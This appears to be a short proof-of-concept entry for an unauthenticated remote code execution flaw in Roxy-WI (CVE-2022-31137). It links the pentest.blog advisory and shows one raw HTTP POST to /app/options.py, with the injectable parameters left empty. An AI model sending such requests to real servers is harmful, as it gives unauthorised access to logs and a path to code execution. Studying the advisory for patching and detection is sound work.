## Roxy-WI 未经身份验证的远程代码执行

> https://pentest.blog/advisory-roxy-wi-unauthenticated-remote-code-executions-cve-2022-31137/
```
POST /app/options.py HTTP/1.1
Host: 192.168.56.116
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 105
Origin: https://192.168.56.114
Dnt: 1
Referer: https://192.168.56.114/app/login.py
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

alert_consumer=notNull&serv=roxy-wi.access.log&rows1=10&grep=&exgrep=&hour=00&minut=00&hour1=23&minut1=45
```
